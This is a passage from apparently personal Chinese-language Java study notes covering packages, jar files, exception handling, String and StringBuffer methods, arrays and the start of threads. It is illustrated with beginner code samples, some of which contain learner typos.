}\n}\n/**\njavac package.java\n如果在命令窗口运行，必须建立一个zhangsan文件夹，在里面建一个lisi子文件夹，把编译好的A.class和M.class放进lisi文件夹里才能正常运行\njava zhangsan.lisi.M\n编译时建议用javac -d . package.java，可以自动建立文件夹，运行同上\n-d表示自动生成包层，.表示这个包层是在当前目录下建立的\n*/\n```\n\n## 同包不同类的相互访问\n\n```java\n//A.java文件\n//package lang;//默认有lang包\nclass A\n{\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\n```\n\n```java\n//B.java文件\nclass B\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.f();//输出AAAA\\n\n    }\n}\n/**\njavac A.java B.java\njava B\n*/\n```\n\n因为类A和类B默认是在同一个无名的包中，所以彼此可以相互访问。只要是非私有成员都可以被同包的另一个类访问。\n\n## 不同包类的相互访问\n\n```java\n//A.java\npackage zhangsan.lisi;\npublic class A\n{//只有公有的类公有的成员才可以被不同包访问\n    public void f()\n    {\n        System.out.printf(\"AAAA\\n\");\n    }\n}\n```\n\n```java\n//B.java\npackage v5le0n9;\n//import zhangsan.lisi.*;//导入包层太多，可以选择直接导入类\nimport zhangsan.lisi.A;\npublic class B\n{\n    public static void main(String[] args)\n    {\n        //A aa = new A();//错误，不在同一个包中\n        //zhangsan.lisi.A aa = new zhangsan.lisi.A();//A类如果是公有的则正确，但一般不这么用，更多用导包，此时，A aa = new A();可用\n        A aa = new A();\n        aa.f();//如果f方法是公有的则正确，输出AAAA\\n\n    }\n}\n/**\njavac -d . A.java B.java或javac -d . B.java A.java\njava v5le0n9.B\n*/\n```\n\n## 不同包的类继承\n\n```java\n//A.java\npackage zhangsan.lisi;\npublic class A\n{\n    public void g()\n    {\n        System.out.printf(\"GGGG\\n\");\n    }\n    protected void b()\n    {\n        System.out.printf(\"BBBB\\n\");\n    }\n}\n```\n\n```java\n//B.java\npackage v5le0n9;\nimport zhangsan.lisi.*;\nclass B extends A\n{\n    public void f()\n    {//在子类内部可以访问从另一个包继承过来的父类的public成员和protected成员\n        g();\n        b();\n    }\n}\nclass M\n{\n    public static void main(String[] args)\n    {\n        B bb = new B();\n        bb.f();//输出GGGG\\nBBBB\\n\n        bb.g();//输出GGGG\\n\n        //bb.b();//错误\n        //在子类外部只能访问从另一个包继承过来的父类的public成员而不能访问protected成员\n    }\n}\n```\n\n## 普通jar包的生成\n\n假设需要将`v5le0b9`和`zhangsan`打包，就新建一个文件夹将`v5le0n9`和`zhangsan`放进去，确保文件夹只有需要打包的内容。\n\n在命令窗口进入新文件夹目录，输入`jar -cvf T.jar *`，生成叫作T.jar的包。\n\n## 如何使用jar包中的类\n\n```java\nimport zhangsan.lisi.A;//导入即可\npublic class Test\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.g();\n    }\n}\n```\n\n如果jar包和新编辑的java文件不在同一个目录下，则在命令窗口编译前，先设置classpath，再编译运行。\n\n```java\nset classpath=xxxx\\xxx\\T.jar;//jar包的绝对路径\n```\n\n# 异常\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.divide(6, 2);//正确\n        //aa.divide(6, 0);//异常\n        System.out.printf(\"看得见我吗？\");//上一句异常直接终止程序，所以这一条不输出\n    }\n}\n/**\nException in thread \"main\" java.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:7)\n\tat v5le0n9.TestConst.main(TestConst.java:17)\n*/\n```\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        try\n        {\n            aa.divide(6, 0);\n        }\n        catch(ArithmeticException e)//算数异常，e用来接收第18行抛出的异常对象，如果不知道try语句抛出什么异常，直接写Exception e也可\n        {//如果try里面的语句出错，则输出\n            System.out.printf(\"除数不能为零\\n\");\n        }\n        System.out.printf(\"看得见\");//上面try和catch捕捉到异常，然后继续往下执行，正常输出\n    }\n}\n/**\n除数不能为零\n看得见\n*/\n```\n\n```java\npublic class TestExcep_3\n{\n    public static void main(String[] args)\n    {\n        int m;\n        try\n        {\n            m = 2;\n            System.out.printf(\"m = %d\\n\", m);//正确\n        }\n        catch(Exception e)\n        {\n            \n        }\n        //System.out.printf(\"m = %d\\n\", m);//错误，可能未初始化变量\n        //放在try里面的语句很有可能执行不成功，编译器做最坏的打算，即没有赋值\n    }\n}\n```\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        //int m;\n        int m = 0;\n        try\n        {\n            m = a / b;\n        }\n        catch(ArithmeticException e)\n        {\n            System.out.printf(\"除数不能为零\\n\");\n        }\n        return m;//错误，可能未初始化变量，所以要给m赋个初始值\n    }\n}\npublic class TestExcep_4\n{\n    public static void main(String[] args)\n    {\n        new A().divide(6, 0);\n    }\n}\n```\n\nError和Exception的区别：Error表示语法错误，而Exception表示程序运行时出现的错误。\n\n## 为什么需要异常\n\n根据上面那个例子，用if...else...语句也可实现，所以为什么需要异常？\n\n```java\nimport java.util.*;//导入util包才能用Scanner\npublic class TestExcep_5\n{\n    public static void main(String[] args)\n    {\n        int i;\n        Scanner sc = new Scanner(System.in);//System.in表示键盘输入\n        i = sc.nextInt();//黑窗口输入一个Int数据类型赋值给i\n        System.out.printf(\"i = %d\\n\", i);//输出\n    }\n}\n/**\n86\ni = 86\n*/\n```\n\n假如输入的不是整型，会报异常。此时，用if...else...语句显得很困难。\n\n```java\n/**\nqwe\nException in thread \"main\" java.util.InputMismatchException\n\tat java.util.Scanner.throwFor(Unknown Source)\n\tat java.util.Scanner.next(Unknown Source)\n\tat java.util.Scanner.nextInt(Unknown Source)\n\tat java.util.Scanner.nextInt(Unknown Source)\n\tat v5le0n9.TestConst.main(TestConst.java:9)\n*/\n```\n\n```java\nimport java.util.*;//导入util包才能用Scanner\npublic class TestExcep_6\n{\n    public static void main(String[] args)\n    {\n        int i;\n        Scanner sc = new Scanner(System.in);//System.in表示键盘输入\n        try\n        {\n            i = sc.nextInt();//终端输入一个Int数据类型赋值给i\n            System.out.printf(\"i = %d\\n\", i);//输出\n        }\n        catch(InputMismatchException e)\n        {//从上面的报错可以看到是输入匹配数据类型异常\n            System.out.printf(\"输入数据不合法\\n\");\n        }        \n    }\n}\n/**\nqwe\n输入数据不合法\n*/\n```\n\n## 异常的处理机制\n\n1. 当Java程序运行时出现问题时，系统会自动检测到该错误，并立即生成一个与该错误对应的异常对象。\n2. 然后把该异常对象提交给Java虚拟机。\n3. Java虚拟机会自动寻找相应的处理代码来处理这个异常，如果没有找到，则由Java虚拟机做一些简单的处理后，程序被强行终止。\n4. 程序员可以自己编写代码来捕捉可能出现的异常，并编写代码来处理相应的异常。\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        return a / b;\n    }\n    public void f()\n    {\n        g();\n    }\n    public void g()\n    {\n        divide(6, 0);\n    }\n}\npublic class TestExcep_7\n{\n    public static void main(String[] args)\n    {\n        new A().f();\n    }\n}\n/**\nException in thread \"main\" java.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:6)\n\tat v5le0n9.A.g(TestConst.java:14)\n\tat v5le0n9.A.f(TestConst.java:10)\n\tat v5le0n9.TestConst.main(TestConst.java:21)\n*/\n/**\n异常解释：\n在main方法有java.lang包下的算术错误：除零错误\n第21行导致第10行错误，第10行导致第14行错误，第14行导致第6行错误\n*/\n```\n\n在调试时，可以用`_printStackTrace`观察哪里出错。\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        return a / b;\n    }\n    public void f()\n    {\n        g();\n    }\n    public void g()\n    {\n        divide(6, 0);\n    }\n}\npublic class TestExcep_8\n{\n    public static void main(String[] args)\n    {\n        try\n        {\n            new A().f();\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();//捕获异常函数\n        }    \n    }\n}\n/**\njava.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:6)\n\tat v5le0n9.A.g(TestConst.java:14)\n\tat v5le0n9.A.f(TestConst.java:10)\n\tat v5le0n9.TestConst.main(TestConst.java:23)\n*/\n/**\n此程序与Excep_7的输出几乎一致，只是第一行前面没有Exception显示\n如果想验证语句是否有错，可以用try...catch()语句，用_printStackTrace找出具体的错误位置\n*/\n```\n\n### 常见异常\n\n#### 空指针异常\n\n```java\npackage v5le0n9;\nclass Person\n{\n    public int age;\n}\npublic class TestNullPointerException\n{\n    public static void main(String[] args)\n    {\n        Person p = null;\n        System.out.println(p.age);\n    }\n}\n/**\nException in thread \"main\" java.lang.NullPointerException\n\tat v5le0n9.TestConst.main(TestConst.java:11)\n*/\n```\n\n#### 下标越界异常\n\n```java\npackage v5le0n9;\npublic class TestIndexOutOf\n{\n    public static void main(String[] args)\n    {\n        String friends[] = {\"Lisa\", \"Bily\", \"Kessy\"};\n        for(int i=0; i<5; i++)\n        {\n            System.out.println(friends[i]);\n        }\n        System.out.println(\"\\nThis is the end.\\n\");\n    }\n}\n/**\nLisa\nBily\nKessy\nException in thread \"main\" java.lang.ArrayIndexOutOfBoundsException: 3\n\tat v5le0n9.TestConst.main(TestConst.java:9)\n*/\n```\n\n#### 算数异常\n\n```java\npackage v5le0n9;\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        aa.divide(6, 2);//正确\n        //aa.divide(6, 0);//异常\n        System.out.printf(\"看得见我吗？\");//上一句异常直接终止程序，所以这一条不输出\n    }\n}\n/**\nException in thread \"main\" java.lang.ArithmeticException: / by zero\n\tat v5le0n9.A.divide(TestConst.java:7)\n\tat v5le0n9.TestConst.main(TestConst.java:17)\n*/\n```\n\n### 异常的分类\n\n$$\nThrowable\n\\begin{cases}\nError\\begin{cases}...\\end{cases}\\\\\nException\\begin{cases}RuntimeException\\begin{cases}ArithmeticException\\\\...\\end{cases}\\\\\n...\\end{cases}\n\\end{cases}\n$$\n\n1. Error是系统错误，程序员无法处理这些异常\n2. Exception是程序员可以捕获并处理的异常\n3. RuntimeException的子类异常是可以处理也可以不处理的异常\n4. 凡是继承自Exception但又不是RuntimeException子类的异常我们都必须捕捉并进行处理\n\n有些异常在编译时就报错。\n\n```java\nimport java.io.*;\nclass A\n{\n    public void f()\n    {//在编译时就报错，必须处理\n        throw new IOException();//throw 抛出异常，这个异常是非RuntimeException子类\n    }\n    public void g()\n    {//在运行时报错\n        throw new ArithmeticException();//RuntimeException子类\n    }\n}\npublic class Exception\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n    }\n}\n```\n\n### 处理异常的两种方式\n\n#### try...catch...\n\n```java\nimport java.io.*;\nclass A\n{\n    public void f()\n    {\n        try\n        {\n            throw new IOException(); \n        }\n        catch(IOException e)\n        {\n            //...\n        }\n    }\n}\n```\n\n#### throws\n\n```java\nimport java.io.*;\nclass A\n{\n    public void f() throws IOException\n    {//throws IOException表示调用f方法时f方法可能会抛出IOException异常，建议调用f方法时最好对f方法可能抛出的IOException异常进行捕捉。如果抛出异常，本方法不处理，交给调用者处理。如果抛出的异常是RuntimeException子类，则调用者可以不处理。\n        //throw new IOException();//也可以不抛出异常\n    }\n}\npublic class Exception_2\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        try\n        {\n            aa.f();\n        }\n        catch(IOExeption e)\n        {\n            //...\n        }\n    }\n}\n```\n\n### 异常处理步骤\n\n```java\ntry\n{\n    //可能出现异常的代码块\n    //语句1;\n   \t//语句2;\n}\ncatch(ExceptionName1 e)\n{\n    //当产生ExceptionName1异常时的处理措施\n}\ncatch(ExceptionName2 e)\n{\n    //当产生ExceptionName2异常时的处理措施\n}\nfinally\n{\n    //无论是否捕捉到异常都必须处理的代码\n}\n```\n\n```java\nclass A\n{\n    int divide(int a, int b)\n    {\n        int m;\n        m = a / b;\n        return m;\n    }\n}\npublic class TestExcep_9\n{\n    try\n    {\n        new A().divide(6, 0);\n    }\n    catch(ArithmeticException e)\n    {\n        System.out.printf(\"huuu\\n\");//输出\n    }\n    catch(ArrayIndexOutOfBoundsException e)\n    {\n        System.out.printf(\"yooooo\\n\");//不输出\n    }\n    finally\n    {\n        System.out.printf(\"hhhh\\n\");//输出\n    }\n}\n```\n\n#### Finally的作用\n\n无论try所指定的程序块中是否抛出异常，也无论catch语句的异常类型是否与所抛出的异常类型一致finally中的代码都会执行。finally语句为异常处理提供一个统一的出口，使得在控制流程转到程序的其它部分之前，能够对程序的装药作统一的管理。通常在finally语句中可以进行资源的清除工作，如关闭打开的文件、删除临时文件等。\n\n## 自定义异常\n\n```java\npackage v5le0n9;\nclass DivisorIsZeroException extends Exception\n{//自定义异常必须是Throwable的一个子类,更确切是Exception的子类\n    public DivisorIsZeroException(String name)\n    {\n        super(name);\n    }\n}\nclass A\n{\n    public int divide(int a, int b) throws DivisorIsZeroException\n    {\n        int m = 0;\n        if(0 == b)\n            throw new DivisorIsZeroException(\"除数不能为零\");\n        else\n            m = a / b;\n        return m;\n    }\n}\npublic class TestExcep_10\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        try\n        {\n            aa.divide(6, 0);\n        }\n        catch(Exception e)\n        {\n            e.printStackTrace();\n        }\n    }\n}\n/**\nv5le0n9.DivisorIsZeroException: 除数不能为零\n\tat v5le0n9.A.divide(TestConst.java:15)\n\tat v5le0n9.TestConst.main(TestConst.java:28)\n*/\n```\n\n## 异常的范围\n\n```java\nclass A extends Exception\n{}\nclass B extends Exception\n{}\nclass C extends Exception\n{}\nclass M\n{\n    void f() throws A,B\n    {}\n}\nclass N extends M\n{\n    //void f() throws A,B,C//范围过大\n    //void f() throws A//可以\n    void f() throws A,B\n    {//可以throws A或B，也可以throws A,B，也可以不throws\n        \n    }\n}\nclass Test\n{\n    public void k(M mm)\n    {\n        try\n        {\n            mm.f();\n        }\n        catch(A aa)\n        {}\n        catch(B bb)\n        {}\n    }\n}\nclass TestExtendExce\n{\n    public static void main(String[] args)\n    {\n        M m = new M();\n        N n = new N();\n    }\n}\n```\n\n## 注意事项\n\n- 所有的catch只能有一个被执行\n\n- 有可能所有的catch都没被执行\n\n- 先catch子类异常再catch父类异常\n\n  ```java\n  class A extends Exception\n  {}\n  class B extends A\n  {}\n  class C extends B\n  {}\n  class M\n  {\n      public void compare(int i, int j) throws A,B\n      {\n          if(i > j)\n              throw new A();\n          else\n              throw new B();\n      }\n  }\n  public class void main(String[] args)\n  {\n      M mm = new M();\n      try\n      {\n          mm.compare(-4, 1);\n      }\n      catch(B bb)\n      {//因为B是A的子类，先catch子类再catch父类\n          System.out.println(\"左边不能小于右边\");\n      }\n      catch(A aa)\n      {\n          System.out.println(\"左边不能大于右边\");\n      }\n  }\n  ```\n\n- catch与catch之间不能有其它代码\n\n- 重写方法抛出异常的范围不能大于被重写方法排除的异常范围\n\n# toString\n\n```java\nclass A// extends Object\n{//A类默认继承Object类，Object类有toString方法\n    public String toString()\n    {\n        return \"hhhh\\n\";\n    }\n}\npublic class TestObject\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        System.out.printf(\"%s\\n\", aa.toString());//输出hhhh\\n,如果不重写，返回“类名@该对象在堆中地址的哈希码”\n    }\n}\n```\n\n```java\npackage v5le0n9;\nclass Point_\n{\n    public int x, y;\n    public Point_(int x, int y)\n    {\n        this.x = x;\n        this.y = y;\n    }\n}\npublic class TestPoint\n{\n    public static void main(String[] args)\n    {\n        Point_ p = new Point_(1, 2);\n        System.out.printf(\"%s\\n\", p);//输出v5le0n9.Point_@28d93b30\n        //相当于父类的_toString方法，返回“类名@该对象在堆中地址的哈希码”\n    }\n}\n```\n\n```java\npackage v5le0n9;\nclass Point_\n{\n    public int x, y;\n    public Point_(int x, int y)\n    {\n        this.x = x;\n        this.y = y;\n    }\n    public String toString()\n    {\n        return \"[\" + x + \",\" + y + \"]\";\n    }\n}\npublic class TestPoint\n{\n    public static void main(String[] args)\n    {\n        Point_ p = new Point_(1, 2);\n        System.out.printf(\"%s\\n\", p);//输出[1,2]\\n\n        System.out.println(p);//输出[1,2]\\n\n    }\n}\n```\n\n# equals\n\n```java\nclass A\n{\n    public int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n}\npublic class TestStringEquals\n{\n\tpublic static void main(String[] args)\n    {\n        A aa1 = new A(2);\n        A aa2 = new A(2);\n        System.out.println(aa1);//A@15db9742，相当于System.out.println(aa1.toString());\n        System.out.println(aa2);//A@6d06d69c,aa1和aa2指向不同的堆地址\n        //equals指示其他某个对象是否与此对象“相等”\n        aa1.equals(aa2);//编译运行无错误\n        System.out.println(aa1.equals(aa2));//输出flase，表明equals是用来判断对象地址是否一样，而不是判断地址存的数值是否一样\n    }\n}\n```\n\n```java\nclass A\n{\n    public int i;\n    public A(int i)\n    {\n        this.i = i;\n    }\n    public boolean equals(Object obj)\n    {\n        //if(this.i == obj.i)//错误，obj是指针，局部变量，形参，因为父类引用不能调用子类特有成员i（利用多态知识）\n        A aa = (A)obj;//形参obj已经指向子类了，所以只要强制转换即可，相当于B bb = (B)aa;\n        if(this.i == aa.i)\n            return true;\n        else\n            return false;\n    }\n}\npublic class TestStringEquals_2\n{\n\tpublic static void main(String[] args)\n    {\n        A aa1 = new A(2);\n        A aa2 = new A(2);\n        System.out.println(aa1.equals(aa2));//如何让这个返回true，需要重写equals方法，地址存的数值一样则返回true\n    }\n}\n```\n\n# String类\n\n```java\npublic class TestString_1\n{\n    public static void main(String[] args)\n    {//_toString已经重写了equals方法\n        String str1 = new String(\"China\");\n        String str2 = new String(\"China\");\n        \n        System.out.println(str1.equals(str2));//true\n        //equals表示此对象的值与形参的值是否相等\n        \n        if(str1 == str2)\n        //==表示对比两个对象的地址是否相等\n            System.out.println(\"str1 == str2\");\n        else\n            System.out.println(\"str1 != str2\");//输出\n        \n        String str3 = \"Chinese\";\n        String str4 = \"Chinese\";\n        //str3与str4都指向了数据区块的同一块内存“Chinese”\n        if(str3 == str4)\n            System.out.println(\"str3 == str4\");//输出\n        else\n            System.out.println(\"str3 != str4\");\n    }\n}\n```\n\n## String类常用方法\n\n| String类方法                                          | 用途                                                       |\n| ----------------------------------------------------- | ---------------------------------------------------------- |\n| public char charAt(int index)                         | 返回字符串中第index个字符                                  |\n| public int length()                                   | 返回字符串的长度                                           |\n| public int indexOf(String str)                        | 返回字符串中出现str的第一个位置                            |\n| public int indexOf(String str, int fromIndex)         | 返回字符串中从fromIndex开始出现str的第一个位置             |\n| public boolean equalsIgnoreCase(String another)       | 比较字符串与another是否一样(忽略大小写)                    |\n| public String replace(char oldChar, char newChar)     | 在字符串中用newChar字符替换oldChar字符                     |\n| public boolean startsWith(String prefix)              | 判断字符串是否以prefix字符串开头                           |\n| public booleab endsWith(String suffix)                | 判断字符串是否以suffix字符串结尾                           |\n| public String toUpperCase()                           | 返回一个字符串为该字符串的大写形式                         |\n| public String toLowerCase()                           | 返回一个字符串为该字符串的小写形式                         |\n| public String substring(int beginIndex)               | 返回该字符串从beginIndex开始到结尾的子字符串               |\n| public String substring(int beginIndex, int endIndex) | 返回该字符串从beginIndex开始到endIndex结尾的字符串         |\n| public static String valueOf(...)                     | 将基本类型数据转换为字符串                                 |\n| public String[] split(String regex)                   | 将一个字符串按照指定的分隔符分分隔，返回分隔后的字符串数组 |\n\n## 常用方法举例\n\n```java\npublic class TestString_2\n{\n    public static void main(String[] args)\n    {\n        //整型转换为字符串\n        int i = 123;\n        //String str = i;//类型不一致\n        String str = String.valueOf(i);\n        System.out.printf(\"str = %s\\n\", str);//str = 123\n        \n        //字符串转换为整型\n        str = \"456\";\n        try\n        {\n            i = Integer.parseInt(str);//这个会抛NumberFormatException异常，比如“45a”\n        \tSystem.out.printf(\"i = %d\\n\", i);\n        }\n        catch(NumberFormatException e)\n        {\n            System.out.println(\"数字格式化异常！\");\n        }\n    }\n}\n```\n\n```java\npublic class Test\n{\n    public static void main(String[] args)\n    {\n        String s1 = \"v5le0n9\", s2 = \"V5LE0N9\";\n        System.out.println(s1.charAt(1));//5\n        System.out.println(s2.length());//7\n        System.out.println(s1.indexOf(\"0n9\"));//4\n        System.out.println(s1.indexOf(\"0N9\"));//-1\n        System.out.println(s1.equals(s2));//false\n        System.out.println(s1.equalsIgnoreCase(s2));//true\n        System.out.println(s1.toUpperCase());//V5LE0N9\n        System.out.println(s2.toLowerCase());//v5le0n9\n        System.out.println(s2.substring(3));//EN09\n        System.out.println(s2.substring(3,5));//E0\n        \n        String s = \"世界如此美好！\";\n        String sr = s.replace(\"世界\", \"生活\");\n        System.out.println(sr);//生活如此美好！\n        System.out.println(s.startsWith(\"世界\"));//true\n        System.out.println(s.endsWith(\"美好\"));//false\n        \n        String st = \"    hello world   \";\n        System.out.println(st.trim());//hello world\n        \n        int j = 1234567;\n        String sNumber = String.valueOf(j);\n        System.out.println(\"j是\"+sNumber.length()+\"位数\");\n        \n        String str = \"Mary,F,1976\";\n        String[] sPlit = str.split(\",\");\n        for(int i=0; i<sPlit.length; i++)\n        {//数组的length不用()\n            System.out.println(sPlit[i]);\n        }\n    }\n}\n```\n\n```java\npublic class TestString_3\n{\n    public static void main(String[] args)\n    {\n        String str = \"abAM,!123\";\n        int cntU = 0;//大写字母个数\n        int cntL = 0;//小写字母个数\n        int cntOther = 0;//其它\n        int i;\n        \n        //方法一\n        for (i=0; i<str.length(); i++)\n        {\n            char ch = str.charAt(i);\n            if(ch>='a' && ch<='z')\n                cntL++;\n            else if(ch>='A' && ch<='Z')\n                cntU++;\n            else\n                cntOther++;\n        }\n        \n        //方法二\n        for(i=0; i<str.length(); i++)\n        {\n            char ch = str.charAt(i);\n            if(Character.isUpperCase(ch))\n                cntU++;\n            else if(Character.isLowerCase(ch))\n                cntL++;\n            else\n                cntOther++;\n        }\n        \n        //方法三\n        String s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n        String s2 = \"abcdefghijklmnopqrstuvwxyz\";\n        for(i=0; i<str,length(); i++)\n        {\n            char ch = str.charAt(i);\n            if(-1 != s1.indexOf(ch))//如果不是-1，说明str中有这个字符\n                cntU++;\n            else if(-1 != s2.indexOf(ch))\n                cntL++;\n            else\n                cntOther++;\n        }\n        \n        System.out.printf(\"大写字母个数为%d\\n\",cntU);\n        System.out.printf(\"小写字母个数为%d\\n\",cntL);\n        System.out.printf(\"其它字符个数为%d\\n\",cntOther);\n    }\n}\n```\n\n```java\npublic class TestString_4\n{\n    public static void main(String[] args)\n    {\n        String str1 = \"abcabcbacbac\";\n        String str2 = \"abc\";\n        int index = -1;\n        int cnt = 0;\n        index = str1.indexOf(str2);\n        while(-1 != index)\n        {\n            cnt++;\n            index = str1.indexOf(str2, index+str2.length());\n        }\n        System.out.printf(\"%d\\n\",cnt);//2\n    }\n}\n```\n\n# printf和println的区别\n\n```java\nclass Dian\n{\n    public int x, y;\n    public Dian(int x,int y)\n    {\n        this.x = x;\n        this.y = y;\n    }\n    public String toString()\n    {\n        return \"[\" + x + \",\" + y + \"]\";\n    }\n}\npublic class TestPrint\n{\n    public static void main(String[] args)\n    {\n        Dian d = new Dian(3, 2);\n        System.out.printf(\"%s\\n\", d);\n        System.out.println(d);\n        \n        int i, j, k;\n        i = 1;\n        j = 2;\n        k = 3;\n        System.out.printf(\"%d的值 + %d的值 是 %d\\n\", i, j, k);\n        System.out.println(i + \"的值\" + j + \"的值 是 \" + k);\n        \n        int m = 47;\n        System.out.println(m);\n        System.out.printf(\"%d\\n\", m);\n        System.out.printf(\"十进制数字%d用十六进制表示是：%#X\\n\", m, m);\n        System.out.println(\"十进制数字\" + m + \"用十六进制表示是：0X\" + Integer.toHexString(m).toUpperCase());\n        //Integer.toHexString()返回的是字符串，将字符串改成大写就直接在后面加toUpperCase()\n        \n        System.out.printf(\"%b\\n\", \"abc\".equals(\"zhangsan\"));\n        System.out.printf(\"%d\\n\", \"abc\".length());\n    }\n}\n```\n\n# StringBuffer\n\nString类对象一旦创建就不可更改，因为String类用final修饰了。如果经常对字符串内容进行修改，则使用StringBuffer。\n\n## StringBuffer类的构造函数\n\n| 构造函数                          | 含义                                                  |\n| --------------------------------- | ----------------------------------------------------- |\n| public StringBuffer()             | 创建一个空的没有任何字符的StringBuffer对象            |\n| public StringBuffer(int capacity) | 创建一个不带字符，但具有指定初始容量的字符串缓冲区    |\n| public StringBuffer(String str)   | 创建一个StringBuffer对象，包含与str对象相同的字符序列 |\n\n## StringBuffer常用方法\n\n| 常用方法                                       | 含义                                                         |\n| ---------------------------------------------- | ------------------------------------------------------------ |\n| public StringBuffer append(...)                | 为该StringBuffer对象添加字符序列，返回添加后的该StringBuffer对象引用 |\n| public StringBuffer insert(...)                | 为该StringBuffer对象在指定位置插入字符序列，返回修改后的该StringBuffer对象引用 |\n| public StringBuffer delete(int start, int end) | 删除从start开始到end-1为止的一段字符序列，返回修改后的该StringBuffer对象引用 |\n| public StringBuffer reverse()                  | 将字符序列逆序，返回修改后的该StringBuffer对象引用           |\n\n```java\npublic class TestStringBuffer\n{\n    public static void main(String[] args)\n    {\n        StringBuffer sb = new StringBuffer();\n        sb.append(\"abc\");\n        sb.append(\"123\");\n        System.out.println(\"sb = \" + sb);//sb = abc123\n        sb.insert(3,\"--\");\n        System.out.println(\"sb = \" + sb);//sb = abc--123\n        sb.delete(2, 6);//把下标[2,6)的字符删除\n        System.out.println(\"sb = \" + sb);//sb = ab23\n        sb.reverse();\n        System.out.println(\"sb = \" + sb);//sb = 32ba\n        String str = sb.toString();\n        System.out.println(\"str = \" + str);//str = 32ba\n    }\n}\n```\n\n```java\npublic class TestStringBuffer_2\n{\n    public static void main(String[] args)\n    {\n        StringBuffer sb = new StringBuffer(\"zhangsan\");\n        //StringBuffer sb2 = \"张三\";//错误，前面是StringBuffer类，而张三是String类，类型不一致\n        System.out.println(sb);//zhangsan\n    }\n}\n```\n\n# 数组\n\n```java\npublic class TestArray\n{\n    public static void mian(String[] args)\n    {//定义数组的三种方法\n        //方式一\n        int[] arr1;\n        arr1 = new int[3];\n        arr1[0] = 0;\n        arr1[1] = 1;\n        arr1[2] = 2;\n        showArr(arr1);\n        \n        //方式二\n        int[] arr2 = new int[]{0,1,2};\n        showArr(arr2);\n        //System.out.println(arr2);//错误，一维数组的内容不能通过println直接输出\n        \n        //错误写法\n        //int[3] arr3 = new int[]{0,1,2};\n        //int[] arr4 = new int[3]{0,1,2};\n        //int[3] arr5 = new int[3]{0,1,2};\n        \n        //方式三\n        int[] arr6 = {0,1,2};\n        showArr(arr6);\n        arr6 = new int[]{5,4,3,2,1};\n        showArr(arr6);\n    }\n    public static void showArr(int[] arr)\n    {\n        for(int i=0; i<arr.length; i++)\n            System.out.println(arr[i]);\n    }\n}\n```\n\n## 创建并使用基本类型数组\n\n```java\npublic class TestArray_2\n{\n    public static void main(String[] args)\n    {//数组直接存数据\n        int[] s;//在栈中生成一个局部变量s\n        s= new int[10];//在堆中生成一个数组对象，长度为10，值默认为0\n        for(int i=0; i<10; i++)\n        {\n            s[i] = 2 * i + 1;//给堆中的每个元素赋值\n            System.out.println(s[i]);\n        }\n    }\n}\n```\n\n## 创建并使用引用类型数组\n\n```java\nclass MyDate\n{\n    private int day;\n    private int month;\n    private int year;\n    public MyDate(int d, int m, int y)\n    {\n        day = d;\n        month = m;\n        year = y;\n    }\n    public void display()\n    {\n        System.out.println(day + \"-\" + month + \"-\" + year);\n    }\n}\npublic class TestArray_3\n{\n    public static void main(String[] args)\n    {//数组存指针变量\n        MyDate[] m;//在栈中生成一个局部变量m\n        m = new MyDate[10];//在堆中生成一个数组对象，长度为10，值默认为NULL\n        for(int i=0; i<10; i++)\n        {\n            m[i] = new MyDate(i+1, i+1, 1990+i);//第i个指针对象指向对应的数据（也在堆中）\n            m[i].display();\n        }\n    }\n}\n```\n\n## 数组的拷贝\n\n```java\nclass TestArrayCopy\n{\n    public static void main(String[] args)\n    {\n        int[] a = {1,2,3,4,5};\n        int[] b = {-1,-2,-3,-4,-5};\n        System.arraycopy(a,0,b,1,2);//把a数组从下标为0的元素开始，长度为2的一串数，从b数组下标为1开始覆盖\n        System.out.println(\"a = \");\n        for(int i=0; i<a.length; i++)\n            System.out.println(a[i]);//a = 12345\n        \n        System.out.println(\"b = \");\n        for(i=0; i<b.length; i++)\n            System.out.println(b[i]);//b = -112-4-5\n    }\n}\n```\n\n## 数组的排序\n\n```java\nimport java.util.*;\npublic class TestArraySort\n{\n    public static void main(String[] args)\n    {\n        int[] data = {1,3,5,7,2,4,6,8,10,9};\n        System.out.println(\"排序前数组data中的内容是：\");\n        showArray(data);\n        \n        Arrays.sort(data);\n        \n        System.out.println(\"排序后数组data中的内容是：\");\n        showArray(data);\n    }\n    public static void showArray(int[] data)\n    {\n        for(int e : data)//把data中的每个元素取出来赋给e\n            System.out.printf(\"%d\\t\", e);\n        System.out.println(\"\");\n    }\n}\n```\n\n# 线程\n\n线程是一个程序里的不同执行路径。\n\n## 创建线程的两种方式\n\n创建线程的第一种方式：\n\n1. 创建一个继承Thread的类(假定类名为A)，并重写Thread的run方法\n2. 构造一个A类对象(假定对象名为aa)\n3. 调用aa的start方法(start方法是从Thread继承过来的)\n\n```java\nclass A extends Thread\n{\n    public void run()\n    {//重写父类的run方法\n        while(true)\n            System.out.println(\"AAAA\");\n    }\n}\npublic class TestThread\n{\n    public static void main(String[] args)\n    {\n        A aa = new A();\n        //aa.run();//陷入死循环，一直输出A（单线程）\n        